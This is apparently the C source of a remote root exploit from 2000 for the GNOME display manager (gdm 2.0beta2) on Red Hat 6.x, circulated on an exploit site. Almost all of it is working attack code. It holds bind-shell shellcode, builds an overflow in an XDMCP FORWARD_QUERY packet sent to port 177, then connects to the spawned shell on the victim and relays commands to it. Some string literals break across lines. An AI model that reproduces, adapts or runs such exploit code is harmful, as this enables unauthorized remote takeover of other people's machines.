// GDM REMOTE EXploit '2000 
// Coded By Crashkiller (pawq@blue.profex.com.pl)
//
// Bug Found  By : Chris Evans - thx to him
//
//
// PRIVATE !!!!!!!!!! !!!!!!!!!!
// SPECIAL THX TO: BugzPl
//
//
// Vunerable version : gdm-2.0beta2-23 ( gnome and single version )
// Not Vulnerable : 1.0.0.35
//
// Vulnerable Platforms :
//
// - RedHat 6.0-6.2
// - Helix GNOME
// - The raw gdm source tarball
//
//   Thix Exploit Works Around Non-Executable Stack Patch By Solar Designer

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h> //connect,socket,rec,send
#include <netinet/in.h>
#include <netdb.h>

// shellcode BY ADM 
char c0de[] =
  "\x33\xDB\x33\xC0\xB0\x1B\xCD\x80" /* alarm(0); */
  "\x33\xD2\x33\xc0\x8b\xDA\xb0\x06\xcd\x80\xfe\xc2\x75\xf4" /* close FDs */
  "\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x62\xeb\x62" /* w/  fork() */
//"\x31\xc0\xb0\x02\x90\x90\x85\xc0\x90\x90\xeb\x62" /* w/o fork() */
  "\x5e\x56\xac\x3c\xfd\x74\x06\xfe\xc0\x74\x0b" /* =\_ who wrote it? */
  "\xeb\xf5\xb0\x30\xfe\xc8\x88\x46\xff\xeb\xec" /* =/` hmm?  */
  "\x5e\xb0\x02\x89\x06\xfe\xc8\x89\x46\x04\xb0\x06\x89\x46\x08\xb0\x66\x31\xdb
"
  "\xfe\xc3\x89\xf1\xcd\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x2a\x66\x89\x46
"
  "\x0e\x8d\x46\x0c\x89\x46\x04\x31\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0"
  "\x66\xfe\xc3\xcd\x80\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04\xcd\x80\xeb\x04"
  "\xeb\x4c\xeb\x52\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xfe\xc3\xcd\x80"
  "\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xfe\xc1\xcd\x80\xb0\x3f\xfe\xc1"
  "\xcd\x80\xb8\x2e\x62\x69\x6e\x40\x89\x06\xb8\x2e\x73\x68\x21\x40\x89\x46"
  "\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e"
  "\x08\x8d\x56\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x45\xff\xff"
  "\xff\xFF\xFD\xFF\x50\x72\x69\x76\x65\x74\x20\x41\x44\x4D\x63\x72\x65\x77";

void logo() {
  printf("------------------------------\n");
  printf("   GDM REMOTE EXPLOIT '2000   \n");
  printf("     Coded By Crashkiller     \n");
  printf("------------------------------\n\n");
}

int make_packet(char *buf) {
  char deathbuf[60+strlen(c0de)+3+1000];
  unsigned short s;
  unsigned char  c;
  int z,a=sizeof(deathbuf);
  unsigned long addr;
  unsigned char o;
  memset(deathbuf, 0x0, sizeof(deathbuf));

  deathbuf[0] = 0x43;
  deathbuf[1] = 0x43;
  deathbuf[2] = 0x43; // a to takie srakie tak ma buc
  deathbuf[3] = 0x43;

  deathbuf[4] = 0x44; // jeszcze nie wiem co to ,ale tez nadpisuje mi cos
  deathbuf[5] = 0x44;
  deathbuf[6] = 0x44;
  deathbuf[7] = 0x44;

  deathbuf[8] = 0x48; // nadpisuje array | // array ma byc 0xbffffa48
  deathbuf[9] = 0xfa;
  deathbuf[10] = 0xff;
  deathbuf[11] = 0xbf;

  deathbuf[12] = 0x42; // nadpisuje adres do zmiennych lokalnych
  deathbuf[13] = 0x42; 
  deathbuf[14] = 0x42;
  deathbuf[15] = 0x42;

  deathbuf[16] = 0x41;
  deathbuf[17] = 0x41; // to tez jakies locale :>
  deathbuf[18] = 0x41;
  deathbuf[19] = 0x41;

  deathbuf[20] = 0x41;
  deathbuf[21] = 0x16; //locale
  deathbuf[22] = 0x06; // istotne - point to our shellcode
  deathbuf[23] = 0x08; //0x08 06 16 41

  deathbuf[24] = 0x41;
  deathbuf[25] = 0x16; // istotne - point to our shellcode
  deathbuf[26] = 0x06;
  deathbuf[27] = 0x08;

  // nasze pikne ret addresy albo jak kto woli dresy
  // 0xbffffa7f - shell

  deathbuf[28] = 0x58;
  deathbuf[29] = 0xfa;
  deathbuf[30] = 0xff; // nadpisywane struktorki 
  deathbuf[31] = 0xbf; //call przedostatni

  deathbuf[32] = 0x41; // RET ADDR - point to our shellcode
  deathbuf[33] = 0x16; //0x08 06 16 41
  deathbuf[34] = 0x06;
  deathbuf[35] = 0x08;

// ---------------------------------------------------------------     
  deathbuf[36] = 0x40; // nadpisuje clnt_sa
  deathbuf[37] = 0xfa;
  deathbuf[38] = 0xff; //&clnt_sa=0x68686868 powinien byc 0xbffffa80 - 40
  deathbuf[39] = 0xbf;

  deathbuf[40] = 0x90; 
  deathbuf[41] = 0x90;
  deathbuf[42] = 0x90; 
  deathbuf[43] = 0x90;

  deathbuf[44] = 0x90; 
  deathbuf[45] = 0x90;
  deathbuf[46] = 0x90; 
  deathbuf[47] = 0x90;

  deathbuf[44] = 0x90; 
  deathbuf[48] = 0x90;
  deathbuf[49] = 0x90; 
  deathbuf[50] = 0x90;

  deathbuf[51] = 0x90; 
  deathbuf[52] = 0x90;
  deathbuf[53] = 0x90; 
  deathbuf[54] = 0x90;

  deathbuf[55] = 0x90; 
  deathbuf[56] = 0x90;
  deathbuf[57] = 0x90; 
  deathbuf[58] = 0x90;
  strcat(deathbuf,c0de);
  for (z=strlen(deathbuf);z<=a;z++) { deathbuf[z]=0x29;} // calkowicie nie
                                                         // istotne :>
  deathbuf[a-3] = 0x0;
  deathbuf[a-2] = 0x0;
  deathbuf[a-1] = 0x0;

  printf("Buf : %d and c0de : %d\n",strlen(deathbuf),strlen(c0de));
  printf("Strlen : %d \n",strlen(deathbuf));

  /* Write the Xdmcp header */
  /* Version */
  s = htons(1);
  memcpy(buf, &s, 2);

  /* Opcode: FORWARD_QUERY */
  s = htons(4);
  memcpy(buf+2, &s, 2);

  /* Length */
  s = htons(1 + 2 + a + 2);
  memcpy(buf+4, &s, 2);

  /* Now we're into FORWARD_QUERY which consists of
   * remote display, remote port, auth info. Remote display is binary
   * IP address data....
   */
  /* Remote display: 1000 A's which incidentally smoke a path
   * right to the stack
   */
  s = htons(sizeof(deathbuf));
  memcpy(buf+6, &s, 2);

  memcpy(buf+8, deathbuf, sizeof(deathbuf));
  /* Display port.. empty data will do */
  s = htons(0);
  memcpy(buf+8+sizeof(deathbuf), &s, 2);
  /* Auth list.. empty data will do */
  c = 0;
  memcpy(buf + 8 + sizeof(deathbuf) + 2, &c, 1);
  return (8+sizeof(deathbuf) + 2 + 1);
}

main(int argc,char *argv[]) {
  int pip,ret,i,a;
  struct sockaddr_in sck;
  char buf[2000],sockbuf[1024];
  unsigned short s;
  long ia;
  char *hostname;
  struct hostent *h;
  fd_set readfds;
  memset(buf , 0x0 ,sizeof(buf));

  logo();
  if (argc<2) 
  {
    printf("Try %s [victim_host]\n",argv[0]);
    exit(-1);
  }

  pip=socket(PF_INET,SOCK_DGRAM,0);
  if (!pip) { perror("socket() ");exit(-1);}
  hostname=argv[1];//b0frun
  ia=inet_addr(hostname); 
  if (ia==-1)   
    if(h=gethostbyname(hostname)) memcpy(&ia,h->h_addr,4); else ia=-1;
    if (ia==-1) { fprintf(stderr,"cannot resolve %s ! try connect to internet m
othafucka\n",hostname); exit(0);
    }   else  {
      printf("Resolved ... looks good!\n");
    }

  sck.sin_family = PF_INET;
  sck.sin_port = 0;
  sck.sin_addr.s_addr=INADDR_ANY;

  if (bind(pip,(struct sockaddr *)&sck, sizeof(sck))<0) 
  { 
    perror("bind() ");
    exit(-1);
  }
  sck.sin_family = PF_INET;
  sck.sin_port = htons(177);
  sck.sin_addr.s_addr=ia;
  i=make_packet(buf);

  sendto(pip,buf,i,0,(struct sockaddr *)&sck,sizeof(sck)); // send packet

  printf("Waiting for a shell ......\n");

  sleep(3);
  close(pip);

  pip=socket(PF_INET,SOCK_STREAM,0);
  if (!pip) 
  {
    perror("Cant open socket!() ");
    exit(-1);
  }
  sck.sin_family = PF_INET;
  sck.sin_port = htons(10752);
  sck.sin_addr.s_addr=ia;

  if (connect(pip,(struct sockaddr *)&sck,sizeof(sck))<0) 
  {
    printf("Sploit failed or you screwed up !\n");
    perror("cant connect() ");
    exit(-1);
  }
  strcpy(sockbuf,"export PATH=/usr/bin:/bin:/usr/sbin:/sbin;/bin/uname -a;/usr/
bin/id;\n");
  write(pip,sockbuf,strlen(sockbuf));
  memset(sockbuf,0x0,sizeof(sockbuf));
  while (1)
  {
    FD_ZERO (&readfds);
    FD_SET (0, &readfds);
    FD_SET (pip, &readfds);
    select (255, &readfds, NULL, NULL, NULL);
    if (FD_ISSET (pip, &readfds))
    {
      memset (sockbuf, 0, 1024);
      ret = read (pip, sockbuf, 1024);
      if (ret <= 0)
      {
        printf ("Connection closed by foreign host.\n");
        exit (-1);
      }
      printf ("%s", sockbuf);
    }
    if (FD_ISSET (0, &readfds))
    {
      memset (sockbuf, 0, 1024);
      read (0, sockbuf, 1024);
      write (pip, sockbuf, strlen(sockbuf));
    }
  }
  close(pip); 
}
/*                   www.hack.co.za   [28 September 2000]*/
